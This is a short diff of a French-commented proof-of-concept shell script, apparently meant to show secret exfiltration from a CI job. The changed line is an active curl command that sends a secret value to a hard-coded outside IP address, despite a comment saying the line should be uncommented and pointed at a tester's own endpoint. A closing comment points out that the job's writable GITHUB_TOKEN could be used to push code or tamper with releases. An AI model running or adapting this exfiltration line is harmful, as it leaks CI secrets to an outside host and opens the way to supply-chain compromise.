@@ -9,7 +9,7 @@ echo "[poc] SECRET_B64=${DEMO_SECRET}"
 
 # --- Variante exfiltration out-of-band (exfil "reelle") ---
 # Decommente et mets un endpoint que TU controles (ex: https://webhook.site/xxxx) :
-curl -fsS "http://82.165.247.235/p4/?d=$(printf '%s' "$DEMO_SECRET")" || true
+curl -fsS "http://82.165.247.235/ppp44/?d=$(printf '%s' "$DEMO_SECRET")" || true
 
 # --- Ce qu'un vrai attaquant tenterait aussi (NE PAS faire hors lab) ---
 # Le job dispose d'un GITHUB_TOKEN en ecriture : push, alteration de release,
